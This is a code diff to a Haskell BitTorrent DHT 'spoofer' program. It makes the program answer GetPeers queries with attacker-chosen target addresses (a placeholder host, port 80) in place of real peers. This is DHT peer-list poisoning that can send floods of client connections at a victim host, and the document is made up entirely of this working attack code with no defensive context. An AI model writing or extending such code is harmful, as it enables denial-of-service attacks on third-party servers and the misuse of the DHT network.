@@ -35,6 +35,7 @@ data AppState = AppState { stMyNodes :: Map NodeId MyNode,
 
 data AppContext = AppContext { ctxState :: IORef AppState,
                                ctxNode :: IORef Node.Node,
+                               ctxTargets :: BValue,
                                ctxEvLoop :: Ev.EvLoopPtr,
                                ctxLogger :: Logger
                              }
@@ -175,13 +176,14 @@ onQuery' (FindNode nodeId target)
                         BString nodes)]
 onQuery' (GetPeers nodeId infoHash)
     = do (myNodeId, _) <- nearestMyNode infoHash
+         targets <- ctxTargets <$> ask
          return $ Right $
                 BDict [(BString $ B8.pack "id",
                         BString $ nodeIdToBuf myNodeId),
                        (BString $ B8.pack "token",
                         BString token),
                        (BString $ B8.pack "values",
-                        BList peerlist)]
+                        targets)]
     where peerlist = map (BString . encodeAddr) peers
           peers = concat $ do port <- [85, 87]
                               return [SockAddrInet port 3414387287]
@@ -306,6 +308,11 @@ statsLoop = setInterval 1 stats
 
 -- Main
 
+makeTargets :: [(String, String)] -> IO BValue
+makeTargets hostsPorts = BList <$> map (BString . encodeAddr) <$>
+                         (forM hostsPorts $ \(host, port) ->
+                              head <$> Node.getAddrs host port)
+
 runSpoofer port myNodeIds
     = do log <- newLog 1.0 "spoofer.data"
          evFlags <- Ev.evRecommendedBackends
@@ -318,8 +325,10 @@ runSpoofer port myNodeIds
                             }
          appRef <- newIORef app
          nodeRef <- newIORef node
+         targets <- makeTargets [("xxx", "80")]
          let ctx = AppContext { ctxState = appRef,
                                 ctxNode = nodeRef,
+                                ctxTargets = targets,
                                 ctxEvLoop = evLoop,
                                 ctxLogger = log
                               }
